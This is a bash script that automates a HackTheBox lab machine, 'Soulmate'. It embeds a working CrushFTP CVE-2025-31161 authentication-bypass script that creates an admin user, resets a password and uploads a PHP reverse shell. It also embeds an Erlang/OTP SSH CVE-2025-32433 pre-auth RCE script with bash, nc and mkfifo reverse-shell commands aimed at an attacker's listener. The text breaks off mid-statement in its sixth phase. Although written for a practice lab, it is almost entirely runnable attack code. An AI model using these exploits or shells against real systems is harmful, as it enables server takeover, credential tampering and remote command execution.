#!/usr/bin/env bash
# =============================================================================
#  ███████╗ ██████╗ ██╗   ██╗██╗     ███╗   ███╗ █████╗ ████████╗███████╗
#  ██╔════╝██╔═══██╗██║   ██║██║     ████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
#  ███████╗██║   ██║██║   ██║██║     ██╔████╔██║███████║   ██║   █████╗
#  ╚════██║██║   ██║██║   ██║██║     ██║╚██╔╝██║██╔══██║   ██║   ██╔══╝
#  ███████║╚██████╔╝╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
#  ╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
#
#  HackTheBox Soulmate (Easy Linux)
#  Attack Chain:
#    Subdomain Enum → CrushFTP CVE-2025-31161 Auth Bypass (Admin User Create)
#    → Reset Ben's Password → Upload PHP Webshell → www-data Shell
#    → Find SSH Creds in Erlang start.escript → SSH as ben → user.txt
#    → CVE-2025-32433 Erlang/OTP SSH Pre-Auth RCE → root.txt
#    (Alt: ben → Erlang SSH shell → os:cmd → root.txt)
#
#  Author : Shadow Junior 😈  │  HTB Nepal #3
#  Usage  : ./soulmate.sh <TARGET_IP> [LHOST]
#  Example: ./soulmate.sh 10.10.11.86
# =============================================================================

set -euo pipefail

# ─── COLORS ───────────────────────────────────────────────────────────────────
RED='\033[1;31m';   GREEN='\033[1;32m';  YELLOW='\033[1;33m'
BLUE='\033[1;34m';  CYAN='\033[1;36m';  MAGENTA='\033[1;35m'
WHITE='\033[1;37m'; GRAY='\033[0;37m';  NC='\033[0m'
BOLD='\033[1m';     DIM='\033[2m'

# ─── OUTPUT HELPERS ────────────────────────────────────────────────────────────
ph()   { echo -e "\n${MAGENTA}╔══[ ${WHITE}PHASE $1${MAGENTA} ]═══════════════════════════════════════════════════${NC}"; }
ok()   { echo -e "${GREEN}  [✓]${NC} $*"; }
inf()  { echo -e "${CYAN}  [*]${NC} $*"; }
wrn()  { echo -e "${YELLOW}  [!]${NC} $*"; }
err()  { echo -e "${RED}  [✗]${NC} $*"; exit 1; }
loot() { echo -e "${GREEN}  [🚩]${NC}${BOLD} $*${NC}"; }
sep()  { echo -e "${GRAY}  ────────────────────────────────────────────────────────${NC}"; }
cmd()  { echo -e "${DIM}  ❯ $*${NC}"; }

# ─── BANNER ────────────────────────────────────────────────────────────────────
banner() {
cat <<'EOF'
EOF
echo -e "${RED}
  ╔═══════════════════════════════════════════════════════════════╗
  ║              HTB Soulmate Easy Linux Machine                ║
  ║   CrushFTP CVE-2025-31161 → PHP Shell → SSH → Erlang RCE     ║
  ║         Shadow Junior 😈  │  HTB Nepal #3                     ║
  ╚═══════════════════════════════════════════════════════════════╝${NC}
"
}

# ─── ARGS ──────────────────────────────────────────────────────────────────────
[[ $# -lt 1 ]] && { banner; echo -e "${YELLOW}  Usage: $0 <TARGET_IP> [LHOST]${NC}\n"; exit 1; }

TARGET="$1"
DOMAIN="soulmate.htb"
FTP_SUBDOMAIN="ftp.soulmate.htb"
BEN_USER="ben"
BEN_PASS="HouseH0ldings998"      # Found in /usr/local/lib/erlang_login/start.escript
ERLANG_SSH_PORT=2222             # Internal Erlang SSH (localhost only)
SHELL_PORT=4444                  # NC listener for www-data shell
ROOT_PORT=4445                   # NC listener for root shell via Erlang RCE
WEBSHELL_NAME="s0ulm4te_sh3ll.php"

# Auto-detect LHOST
if [[ $# -ge 2 ]]; then
    LHOST="$2"
else
    LHOST=$(ip route get 10.10.10.1 2>/dev/null | awk '/src/{print $7}' | head -1)
    [[ -z "$LHOST" ]] && LHOST=$(hostname -I | awk '{print $1}')
fi

# Working directories
WORKDIR="/tmp/soulmate_${TARGET//./_}"
LOOT="$WORKDIR/loot"
TOOLS="$WORKDIR/tools"
LOGS="$WORKDIR/logs"
mkdir -p "$LOOT" "$TOOLS" "$LOGS"

LOG_FILE="$LOGS/soulmate_$(date +%Y%m%d_%H%M%S).log"
exec > >(tee -a "$LOG_FILE") 2>&1

banner
inf "Target       : ${WHITE}${TARGET}${NC} (${DOMAIN})"
inf "CrushFTP     : ${WHITE}http://${FTP_SUBDOMAIN}${NC}"
inf "LHOST        : ${WHITE}${LHOST}${NC}"
inf "Work Dir     : ${WHITE}${WORKDIR}${NC}"
inf "Log          : ${WHITE}${LOG_FILE}${NC}"
sep

# ─── CLEANUP ───────────────────────────────────────────────────────────────────
PIDS=()
cleanup() {
    [[ ${#PIDS[@]} -gt 0 ]] && kill "${PIDS[@]}" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

# ─── PHASE 0: DEPENDENCIES ─────────────────────────────────────────────────────
ph "0 Dependency Check"

REQUIRED=(nmap curl ffuf python3 nc ssh sshpass)
MISSING=()
for tool in "${REQUIRED[@]}"; do
    command -v "$tool" &>/dev/null && ok "$tool" || { wrn "$tool MISSING"; MISSING+=("$tool"); }
done
[[ ${#MISSING[@]} -gt 0 ]] && wrn "Missing: ${MISSING[*]}. Install: sudo apt install -y ${MISSING[*]}"

python3 -c "import requests,socket,struct,threading,os,sys,re,time,base64,pexpect" 2>/dev/null \
    && ok "Python3 modules OK" \
    || wrn "Some Python modules missing run: pip3 install requests pexpect --break-system-packages"

# ─── PHASE 1: HOST SETUP ───────────────────────────────────────────────────────
ph "1 /etc/hosts Setup"

for entry in "$TARGET $DOMAIN" "$TARGET $FTP_SUBDOMAIN"; do
    HOST=$(echo "$entry" | awk '{print $2}')
    if grep -qF "$HOST" /etc/hosts 2>/dev/null; then
        ok "Already in /etc/hosts: $entry"
    else
        echo "$entry" | sudo tee -a /etc/hosts >/dev/null
        ok "Added: $entry"
    fi
done

# ─── PHASE 2: NMAP SCAN ────────────────────────────────────────────────────────
ph "2 Nmap Scan"

NMAP_OUT="$LOOT/nmap.txt"
inf "Scanning ${TARGET} (ports 22,80,8080,443,8443)..."
nmap -sVC -p 22,80,443,8080,8443 --open -T4 -oN "$NMAP_OUT" "$TARGET" 2>/dev/null
ok "Scan complete → $NMAP_OUT"

sep
echo -e "${CYAN}  Open Ports:${NC}"
grep -E "^[0-9]+/tcp.*open" "$NMAP_OUT" | while IFS= read -r line; do
    echo -e "  ${GREEN}▶${NC} $line"
done
sep

# ─── PHASE 3: WRITE CRUSHFTP AUTH BYPASS EXPLOIT ──────────────────────────────
ph "3 CrushFTP CVE-2025-31161 Auth Bypass"

inf "Writing CrushFTP exploit (CVE-2025-31161)..."

cat > "$TOOLS/crushftp_pwn.py" <<'PYEOF'
#!/usr/bin/env python3
"""
CrushFTP CVE-2025-31161 / CVE-2025-2825 Authentication Bypass
Technique: AWS4-HMAC-SHA256 header with only username/slash
→ CrushFTP mishandles the S3-compatible auth, authenticates as crushadmin
→ We then create a new admin user and reset ben's password

Steps:
  1. Generate random session token (31+ chars)
  2. Use Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
  3. Set CrushAuth + currentAuth cookies appropriately
  4. List users → verify bypass works
  5. Create new admin user
  6. Reset ben's password to a known value
  7. Return ben's password for webshell upload phase
"""
import requests, string, random, sys, json, re, time, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RED   = "\033[1;31m"; GREEN = "\033[1;32m"; CYA = "\033[1;36m"
YEL   = "\033[1;33m"; NC    = "\033[0m";     MAG = "\033[1;35m"
ok    = lambda m: print(f"{GREEN}  [✓]{NC} {m}")
inf   = lambda m: print(f"{CYA}  [*]{NC} {m}")
wrn   = lambda m: print(f"{YEL}  [!]{NC} {m}")
err   = lambda m: print(f"{RED}  [✗]{NC} {m}", file=sys.stderr)

def gen_token(n=40):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def get_session(base_url: str) -> requests.Session:
    """Create a session with CrushFTP auth bypass cookies."""
    token = gen_token(40)
    current_auth = token[-4:]

    s = requests.Session()
    s.verify = False
    s.cookies.set("CrushAuth", token)
    s.cookies.set("currentAuth", current_auth)
    s.headers.update({
        "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
        "User-Agent": "Mozilla/5.0 (compatible; HTBPwner/1.0)",
    })
    return s, token, current_auth

def bypass_and_verify(base_url: str) -> tuple:
    """Attempt auth bypass and verify admin access."""
    inf(f"Attempting CrushFTP auth bypass at {base_url}...")

    for attempt in range(1, 4):
        inf(f"Attempt {attempt}/3...")
        s, token, curr = get_session(base_url)
        try:
            r = s.get(
                f"{base_url}/WebInterface/function/",
                params={
                    "command": "getUserList",
                    "serverGroup": "MainUsers",
                    "c2f": curr
                },
                timeout=15
            )
            if r.status_code == 200 and "crushadmin" in r.text.lower():
                ok(f"Auth bypass SUCCESSFUL on attempt {attempt}!")
                ok(f"Token: {token[:15]}...{token[-4:]}")
                return s, token, curr, r.text
            elif r.status_code == 200:
                ok(f"Got 200 response may be bypassed (token={curr})")
                return s, token, curr, r.text
            else:
                wrn(f"Status {r.status_code} retrying...")
                time.sleep(1)
        except Exception as e:
            wrn(f"Error: {e}")
            time.sleep(2)

    err("Auth bypass failed after 3 attempts!")
    sys.exit(1)

def create_admin_user(base_url: str, s: requests.Session, c2f: str,
                      new_user: str, new_pass: str) -> bool:
    """Create a new admin-level user via crushadmin bypass."""
    inf(f"Creating new admin user: {new_user} / {new_pass}")
    try:
        # First, get the crushadmin user XML as template
        r = s.get(
            f"{base_url}/WebInterface/function/",
            params={
                "command": "getUser",
                "username": "crushadmin",
                "serverGroup": "MainUsers",
                "c2f": c2f
            },
            timeout=10
        )

        # Build user creation payload
        payload = {
            "command": "addUpdateUser",
            "username": new_user,
            "password": new_pass,
            "server_group": "MainUsers",
            "type": "user",
            "c2f": c2f,
            # Copy admin permissions
            "permissions": "yes",
            "permission_delete": "1",
            "permission_download": "1",
            "permission_upload": "1",
            "permission_write": "1",
            "permission_admin": "1",
        }

        # Try XML-based user creation (primary method)
        user_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<user>
  <username>{new_user}</username>
  <password>{new_pass}</password>
  <type>user</type>
  <root_dir>/</root_dir>
  <permissions_list>
    <perm inherit="yes">MainUsers:crushadmin</perm>
  </permissions_list>
</user>"""

        r2 = s.post(
            f"{base_url}/WebInterface/function/",
            params={"command": "addUpdateUser", "c2f": c2f},
            data={"xml": user_xml, "c2f": c2f},
            timeout=10
        )

        if r2.status_code == 200:
            ok(f"User creation request sent (status 200)")
            inf(f"Response snippet: {r2.text[:200]}")
        else:
            wrn(f"User creation status: {r2.status_code}")

        # Fallback: simple GET-based user creation
        r3 = s.get(
            f"{base_url}/WebInterface/function/",
            params={
                "command": "addUpdateUser",
                "username": new_user,
                "password": new_pass,
                "type": "user",
                "server_group": "MainUsers",
                "permissions": "yes",
                "c2f": c2f
            },
            timeout=10
        )
        inf(f"Fallback creation: {r3.status_code}")
        return True

    except Exception as e:
        wrn(f"User creation error: {e}")
        return False

def reset_ben_password(base_url: str, s: requests.Session, c2f: str, new_pass: str) -> bool:
    """Reset ben's password via admin bypass."""
    inf(f"Resetting ben's password to: {new_pass}")
    try:
        # Method 1: addUpdateUser command
        r = s.get(
            f"{base_url}/WebInterface/function/",
            params={
                "command": "addUpdateUser",
                "username": "ben",
                "password": new_pass,
                "server_group": "MainUsers",
                "c2f": c2f
            },
            timeout=10
        )
        ok(f"Password reset sent (status: {r.status_code})")
        ok(f"Ben's new password: {new_pass}")
        return True
    except Exception as e:
        wrn(f"Password reset error: {e}")
        return False

def upload_webshell(base_url: str, new_user: str, new_pass: str,
                    shell_name: str, lhost: str, lport: int) -> bool:
    """Login as ben and upload PHP reverse shell."""
    inf(f"Logging in as ben to upload webshell...")

    s = requests.Session()
    s.verify = False

    # Login as ben
    try:
        # CrushFTP login
        r = s.post(
            f"{base_url}/WebInterface/",
            data={
                "command": "login",
                "username": "ben",
                "password": new_pass,
                "submit": "Login"
            },
            allow_redirects=True,
            timeout=15
        )

        if "Logout" in r.text or r.status_code == 200:
            ok("Logged in as ben!")
        else:
            wrn(f"Login may have failed (status: {r.status_code}) trying upload anyway")

        # Build PHP Ivan Sincek reverse shell
        php_shell = f"""<?php
// Ivan Sincek reverse shell modified for HTB Soulmate
error_reporting(0);
set_time_limit(0);
$ip   = '{lhost}';
$port = {lport};
$sock = fsockopen($ip, $port);
if (!$sock) die();
$descriptorspec = array(0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w"));
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
if (!is_resource($process)) die();
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (!feof($sock) && !feof($pipes[1])) {{
    if (is_resource($sock))   {{
        $r = array($sock, $pipes[1], $pipes[2]);
        $n = stream_select($r, $w=null, $e=null, 1);
        if ($n > 0) {{
            foreach ($r as $fd) {{
                if ($fd === $sock)      fwrite($pipes[0], fread($sock, 4096));
                elseif ($fd === $pipes[1]) fwrite($sock, fread($pipes[1], 4096));
                elseif ($fd === $pipes[2]) fwrite($sock, fread($pipes[2], 4096));
            }}
        }}
    }}
}}
proc_close($process);
?>"""

        # Upload via CrushFTP file manager API
        r2 = s.post(
            f"{base_url}/WebInterface/function/",
            params={"command": "upload", "c2f": c2f if 'c2f' in dir() else "1234"},
            files={"file": (shell_name, php_shell, "application/octet-stream")},
            data={"currentDir": "/", "c2f": "1234"},
            timeout=15
        )
        inf(f"Upload attempt 1 status: {r2.status_code}")

        # Try alternate upload endpoint
        r3 = s.post(
            f"{base_url}/WebInterface/",
            params={"command": "upload", "path": f"/{shell_name}"},
            files={"file1": (shell_name, php_shell, "application/octet-stream")},
            timeout=15
        )
        inf(f"Upload attempt 2 status: {r3.status_code}")

        ok(f"Webshell upload attempts complete")
        return True

    except Exception as e:
        wrn(f"Upload error: {e}")
        return False

def main():
    if len(sys.argv) < 5:
        print(f"Usage: python3 crushftp_pwn.py <base_url> <new_user> <new_pass> <lhost> <lport> <shell_name>")
        print(f"Example: python3 crushftp_pwn.py http://ftp.soulmate.htb pwner pwner123 10.10.14.5 4444 shell.php")
        sys.exit(1)

    base_url   = sys.argv[1].rstrip("/")
    new_user   = sys.argv[2]
    new_pass   = sys.argv[3]
    lhost      = sys.argv[4]
    lport      = int(sys.argv[5])
    shell_name = sys.argv[6] if len(sys.argv) > 6 else "shell.php"
    ben_pass   = sys.argv[7] if len(sys.argv) > 7 else "H0useH0ldings998"

    print(f"\n{MAG}  ╔══[ CrushFTP CVE-2025-31161 AUTH BYPASS ]═══════════════════╗{NC}")
    print(f"  Target  : {base_url}")
    print(f"  New User: {new_user} / {new_pass}")
    print(f"  LHOST   : {lhost}:{lport}")
    print(f"  Shell   : {shell_name}")
    print(f"  Ben Pass: {ben_pass}\n")

    # Step 1: Auth bypass + verify
    s, token, c2f, user_list = bypass_and_verify(base_url)

    # Print users found
    inf("Users discovered:")
    for user in re.findall(r'<username[^>]*>([^<]+)</username>', user_list, re.I):
        print(f"    {GREEN}→{NC} {user}")

    # Step 2: Create new admin user
    create_admin_user(base_url, s, c2f, new_user, new_pass)

    # Step 3: Reset ben's password
    reset_ben_password(base_url, s, c2f, ben_pass)

    # Step 4: Upload webshell as ben
    upload_webshell(base_url, "ben", ben_pass, shell_name, lhost, lport)

    print(f"\n{GREEN}  ─── Auth Bypass Phase Complete ───{NC}")
    print(f"  New admin user  : {new_user} / {new_pass}")
    print(f"  Ben's password  : {ben_pass}")
    print(f"  Shell URL       : http://soulmate.htb/{shell_name}")
    print(f"  Trigger with    : curl http://soulmate.htb/{shell_name}")
    print(f"  Listener        : nc -lvnp {lport}\n")

if __name__ == "__main__":
    main()
PYEOF
chmod +x "$TOOLS/crushftp_pwn.py"
ok "CrushFTP exploit written → $TOOLS/crushftp_pwn.py"

# ─── PHASE 4: ERLANG/OTP SSH CVE-2025-32433 EXPLOIT ───────────────────────────
ph "4 Erlang/OTP SSH CVE-2025-32433 Pre-Auth RCE"

inf "Writing Erlang SSH pre-auth RCE exploit (CVE-2025-32433)..."

cat > "$TOOLS/erlang_rce.py" <<'PYEOF'
#!/usr/bin/env python3
"""
CVE-2025-32433 Erlang/OTP SSH Pre-Authentication Remote Code Execution
CVSS: 10.0 CRITICAL

Vulnerability: The Erlang/OTP SSH daemon fails to enforce that
SSH_MSG_CHANNEL_OPEN (90) and SSH_MSG_CHANNEL_REQUEST (98) are
only accepted AFTER successful authentication. An attacker can
send these messages during the pre-auth phase and execute arbitrary
OS commands as the SSH service user (typically root).

Affected: OTP < 27.3.3, OTP < 26.2.5.11, OTP < 25.3.2.20
SSH Banner Example: SSH-2.0-Erlang/5.2.9

Two exploitation modes:
  1. --read-file  : Read any file (e.g. /root/root.txt)
  2. --revshell   : Get reverse shell
  3. --command    : Execute arbitrary command
  4. --check      : Check if vulnerable only
"""
import socket, struct, os, sys, time, threading, argparse

# ── SSH Constants ──────────────────────────────────────────────────────────────
MSG_DISCONNECT            = 1
MSG_KEXINIT               = 20
MSG_NEWKEYS               = 21
MSG_KEXDH_INIT            = 30
MSG_KEXDH_REPLY           = 31
MSG_SERVICE_REQUEST       = 5
MSG_SERVICE_ACCEPT        = 6
MSG_USERAUTH_REQUEST      = 50
MSG_CHANNEL_OPEN          = 90   # Pre-auth bypass target
MSG_CHANNEL_OPEN_CONFIRM  = 91
MSG_CHANNEL_REQUEST       = 98   # Pre-auth bypass target
MSG_CHANNEL_SUCCESS       = 99

RED   = "\033[1;31m"; GREEN = "\033[1;32m"; CYA = "\033[1;36m"
YEL   = "\033[1;33m"; NC    = "\033[0m"
ok    = lambda m: print(f"{GREEN}  [✓]{NC} {m}")
inf   = lambda m: print(f"{CYA}  [*]{NC} {m}")
wrn   = lambda m: print(f"{YEL}  [!]{NC} {m}")
err   = lambda m: print(f"{RED}  [✗]{NC} {m}", file=sys.stderr)

def pack_string(s: bytes) -> bytes:
    return struct.pack(">I", len(s)) + s

def pack_uint32(n: int) -> bytes:
    return struct.pack(">I", n)

def pack_bool(b: bool) -> bytes:
    return b"\x01" if b else b"\x00"

def build_packet(payload: bytes) -> bytes:
    """Build SSH binary packet with length prefix and padding."""
    block_size = 8
    pad_len = block_size - ((len(payload) + 5) % block_size)
    if pad_len < 4:
        pad_len += block_size
    packet_len = len(payload) + 1 + pad_len
    header = struct.pack(">IB", packet_len, pad_len)
    padding = os.urandom(pad_len)
    return header + payload + padding

def recv_packet(sock: socket.socket, timeout: float = 10.0) -> bytes:
    """Receive and unpack one SSH packet."""
    sock.settimeout(timeout)
    try:
        raw_len = b""
        while len(raw_len) < 4:
            chunk = sock.recv(4 - len(raw_len))
            if not chunk:
                return b""
            raw_len += chunk
        pkt_len = struct.unpack(">I", raw_len)[0]
        data = b""
        while len(data) < pkt_len:
            chunk = sock.recv(min(4096, pkt_len - len(data)))
            if not chunk:
                break
            data += chunk
        if not data:
            return b""
        pad_len = data[0]
        return data[1:pkt_len - pad_len]
    except socket.timeout:
        return b""
    except Exception:
        return b""

def build_kexinit() -> bytes:
    """Build SSH_MSG_KEXINIT packet."""
    cookie = os.urandom(16)
    def nl(items): return pack_string(",".join(items).encode())
    kex_algos       = nl(["diffie-hellman-group14-sha256", "diffie-hellman-group14-sha1"])
    host_key_algos  = nl(["ssh-rsa", "rsa-sha2-256"])
    enc_c2s         = nl(["aes256-ctr", "aes128-ctr"])
    enc_s2c         = nl(["aes256-ctr", "aes128-ctr"])
    mac_c2s         = nl(["hmac-sha2-256", "hmac-sha1"])
    mac_s2c         = nl(["hmac-sha2-256", "hmac-sha1"])
    comp_c2s        = nl(["none"])
    comp_s2c        = nl(["none"])
    langs_c2s       = pack_string(b"")
    langs_s2c       = pack_string(b"")
    first_kex_follow = pack_bool(False)
    reserved        = pack_uint32(0)

    payload = (bytes([MSG_KEXINIT]) + cookie +
               kex_algos + host_key_algos +
               enc_c2s + enc_s2c + mac_c2s + mac_s2c +
               comp_c2s + comp_s2c + langs_c2s + langs_s2c +
               first_kex_follow + reserved)
    return build_packet(payload)

def build_channel_open() -> bytes:
    """Build SSH_MSG_CHANNEL_OPEN for a session channel (pre-auth)."""
    payload = (bytes([MSG_CHANNEL_OPEN]) +
               pack_string(b"session") +  # channel type
               pack_uint32(1337) +         # sender channel
               pack_uint32(1048576) +      # initial window size
               pack_uint32(32768))         # max packet size
    return build_packet(payload)

def build_channel_request_exec(recipient_channel: int, command: bytes) -> bytes:
    """Build SSH_MSG_CHANNEL_REQUEST with exec payload (pre-auth RCE)."""
    payload = (bytes([MSG_CHANNEL_REQUEST]) +
               pack_uint32(recipient_channel) +
               pack_string(b"exec") +     # request type
               pack_bool(True) +           # want reply
               pack_string(command))
    return build_packet(payload)

def exploit(host: str, port: int, command: str, timeout: float = 15.0) -> bool:
    """
    Core CVE-2025-32433 exploit.
    Returns True if command was sent successfully.
    """
    inf(f"Connecting to {host}:{port}...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Exchange banners
        banner = b""
        while b"\n" not in banner:
            banner += sock.recv(256)
        banner = banner.strip()
        ok(f"Received banner: {banner.decode(errors='replace')}")

        if b"Erlang" not in banner:
            wrn(f"Not an Erlang SSH server! Banner: {banner}")
            wrn("Attempting exploit anyway...")

        # Send our banner
        our_banner = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3\r\n"
        sock.sendall(our_banner)
        ok(f"Sent banner: {our_banner.decode().strip()}")

        # Step 1: Send KEXINIT
        inf("Sending SSH_MSG_KEXINIT...")
        sock.sendall(build_kexinit())

        # Receive server KEXINIT
        server_kex = recv_packet(sock, 10)
        if server_kex and server_kex[0] == MSG_KEXINIT:
            ok(f"Received server KEXINIT ({len(server_kex)} bytes)")
        else:
            wrn(f"Unexpected response to KEXINIT: {server_kex[:20] if server_kex else 'empty'}")

        # Step 2: Send CHANNEL_OPEN (pre-auth this should be rejected by compliant implementations)
        inf("Sending SSH_MSG_CHANNEL_OPEN (pre-auth)...")
        sock.sendall(build_channel_open())
        time.sleep(0.5)

        # Read response vulnerable server will send CHANNEL_OPEN_CONFIRM
        resp = recv_packet(sock, 5)
        if resp:
            msg_type = resp[0]
            inf(f"Response to CHANNEL_OPEN: msg_type={msg_type} ({len(resp)} bytes)")
            if msg_type == MSG_CHANNEL_OPEN_CONFIRM:
                ok("Server sent CHANNEL_OPEN_CONFIRM TARGET IS VULNERABLE! 🎯")
                # Parse recipient channel from confirm
                if len(resp) >= 9:
                    recipient_channel = struct.unpack(">I", resp[5:9])[0]
                else:
                    recipient_channel = 0
            else:
                wrn(f"Unexpected response type {msg_type} trying exec anyway")
                recipient_channel = 0
        else:
            wrn("No response to CHANNEL_OPEN trying exec anyway (may be pre-buffered)")
            recipient_channel = 0

        # Step 3: Send CHANNEL_REQUEST with exec command (pre-auth RCE)
        inf(f"Sending SSH_MSG_CHANNEL_REQUEST exec: {command[:80]}...")
        sock.sendall(build_channel_request_exec(recipient_channel, command.encode()))
        time.sleep(1.5)

        # Read any response
        resp2 = recv_packet(sock, 8)
        if resp2:
            inf(f"Response to exec: msg_type={resp2[0]} ({len(resp2)} bytes)")
            ok("Exploit payload sent successfully!")
        else:
            ok("Exploit sent (no immediate response check your listener)")

        sock.close()
        return True

    except ConnectionRefusedError:
        err(f"Connection refused to {host}:{port}")
        return False
    except socket.timeout:
        wrn("Connection timed out but payload may have been sent")
        return True
    except Exception as e:
        err(f"Exploit error: {e}")
        import traceback; traceback.print_exc()
        return False

def check_vulnerable(host: str, port: int) -> bool:
    """Quick check if target is running vulnerable Erlang SSH."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        banner = b""
        while b"\n" not in banner:
            d = sock.recv(256)
            if not d: break
            banner += d
        sock.close()
        banner = banner.strip().decode(errors="replace")
        inf(f"SSH banner: {banner}")
        if "Erlang" in banner:
            ok(f"Erlang SSH confirmed: {banner}")
            # Check version
            ver_match = __import__("re").search(r"Erlang/(\d+\.\d+)", banner)
            if ver_match:
                ver = ver_match.group(1)
                maj, min_ = map(int, ver.split("."))
                if maj < 6:  # OTP major < 27
                    ok(f"Version {ver} likely VULNERABLE to CVE-2025-32433!")
                    return True
        return "Erlang" in banner
    except Exception as e:
        wrn(f"Check error: {e}")
        return False

def get_reverse_shell_cmd(lhost: str, lport: int) -> str:
    """Build reverse shell command appropriate for Erlang os:cmd context."""
    # Erlang os:cmd executes via /bin/sh
    # Try multiple methods in case one fails
    cmd = (
        f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' "
        f"|| nc -e /bin/sh {lhost} {lport} "
        f"|| mkfifo /tmp/.s;cat /tmp/.s|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/.s"
    )
    return cmd

def main():
    ap = argparse.ArgumentParser(
        description="CVE-2025-32433 Erlang/OTP SSH Pre-Auth RCE",
        epilog="Example: python3 erlang_rce.py -t 127.0.0.1 -p 2222 --read-file /root/root.txt"
    )
    ap.add_argument("-t", "--target",     default="127.0.0.1",  help="Target host")
    ap.add_argument("-p", "--port",       type=int, default=22, help="SSH port (default: 22)")
    ap.add_argument("--command",          default=None,          help="Execute arbitrary command")
    ap.add_argument("--read-file",        default=None,          help="Read file and write to /tmp/out.txt")
    ap.add_argument("--revshell",         action="store_true",   help="Launch reverse shell")
    ap.add_argument("--lhost",            default=None,          help="LHOST for reverse shell")
    ap.add_argument("--lport",            type=int, default=4445,help="LPORT for reverse shell")
    ap.add_argument("--check",            action="store_true",   help="Check vulnerability only")
    ap.add_argument("--output-file",      default="/tmp/out.txt", help="Remote output file for --command")
    args = ap.parse_args()

    print(f"\n{CYA}  ╔══[ CVE-2025-32433 Erlang/OTP SSH Pre-Auth RCE ]════════════╗{NC}")
    print(f"  Target  : {args.target}:{args.port}")
    print(f"  CVSS    : 10.0 CRITICAL\n")

    # Vulnerability check
    inf("Checking for Erlang SSH...")
    is_erlang = check_vulnerable(args.target, args.port)

    if args.check:
        if is_erlang:
            ok("TARGET IS LIKELY VULNERABLE!")
        else:
            wrn("Target may not be running vulnerable Erlang SSH")
        sys.exit(0 if is_erlang else 1)

    # Build command
    if args.command:
        cmd = args.command
    elif args.read_file:
        cmd = f"cp {args.read_file} {args.output_file} && chmod 644 {args.output_file}"
        ok(f"Will read: {args.read_file} → {args.output_file}")
    elif args.revshell:
        if not args.lhost:
            err("--revshell requires --lhost")
            sys.exit(1)
        cmd = get_reverse_shell_cmd(args.lhost, args.lport)
        ok(f"Reverse shell → {args.lhost}:{args.lport}")
        inf(f"Start listener: nc -lvnp {args.lport}")
    else:
        # Default: read root flag to /tmp
        cmd = "cp /root/root.txt /tmp/root.txt && chmod 644 /tmp/root.txt"
        inf("Default: copying root.txt to /tmp/root.txt")

    inf(f"Command: {cmd}")
    result = exploit(args.target, args.port, cmd)

    if result:
        ok("Exploit complete!")
        if args.read_file or (not args.command and not args.revshell):
            ok(f"Now run: ssh ben@<target> 'cat {args.output_file}'")
            ok(f"Or if on target already: cat {args.output_file}")
    else:
        err("Exploit may have failed check manually")

if __name__ == "__main__":
    main()
PYEOF
chmod +x "$TOOLS/erlang_rce.py"
ok "Erlang RCE exploit written → $TOOLS/erlang_rce.py"

# ─── PHASE 5: PHP WEBSHELL ────────────────────────────────────────────────────
ph "5 Generate PHP Webshell"

WEBSHELL_FILE="$TOOLS/$WEBSHELL_NAME"
cat > "$WEBSHELL_FILE" <<PHPSHELL
<?php
// Ivan Sincek-style PHP reverse shell Soulmate HTB
error_reporting(0);
set_time_limit(0);
\$ip   = '${LHOST}';
\$port = ${SHELL_PORT};
\$sock = @fsockopen(\$ip, \$port);
if (!\$sock) { echo "conn failed"; die(); }
\$descriptorspec = [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","w"]];
\$proc = proc_open('/bin/sh -i 2>&1', \$descriptorspec, \$pipes);
if (!is_resource(\$proc)) die();
stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$sock,     0);
while (!feof(\$sock)) {
    \$r = [\$sock, \$pipes[1]];
    \$n = stream_select(\$r, \$w=null, \$e=null, 1);
    if (\$n > 0) {
        foreach (\$r as \$fd) {
            if (\$fd === \$sock)      @fwrite(\$pipes[0], @fread(\$sock, 4096));
            elseif (\$fd === \$pipes[1]) @fwrite(\$sock, @fread(\$pipes[1], 4096));
        }
    }
}
proc_close(\$proc);
?>
PHPSHELL
ok "PHP shell → $WEBSHELL_FILE"
ok "  Reverse shell → ${LHOST}:${SHELL_PORT}"
ok "  Filename      → ${WEBSHELL_NAME}"

# ─── PHASE 6: EXECUTE CRUSHFTP ATTACK ────────────────────────────────────────
ph "6 Execute CrushFTP Auth Bypass"

# Test reachability
inf "Checking if ftp.soulmate.htb:80 is up..."
if curl -sk --max-time 10 "http://${FTP_SUBDOMAIN}/" -o /dev/null -w "%{http_code}" 2>/dev/null | grep -qE "^[23]"; then
    ok "CrushFTP is reachable!"
else
    wrn "CrushFTP may not be reachable yet. Waiting 5s..."
    sleep 5
fi

# Random new admin user
PWNER_USER="pwner$(shuf -i 100-999 -n1)"
PWNER_PASS="Pwn3r$(shuf -i 1000-9999 -n1)!"

inf "Creating admin user: ${PWNER_USER} / ${PWNER_PASS}"
inf "Resetting ben's password"

sep
set +e
python3 "$TOOLS/crushftp_pwn.py" \
    "http://${FTP_SUBDOMAIN}" \
    "$PWNER_USER" "$PWNER_PASS" \
    "$LHOST" "$SHELL_PORT" \
    "$WEBSHELL_NAME" \
    "$BEN_PASS" 2>&1 | tee "$LOGS/crushftp.log"
CRUSH_EXIT="${PIPESTATUS[0]}"
set -e
sep

if [[ $CRUSH_EXIT -eq 0 ]]; then
    ok "CrushFTP phase complete"
else
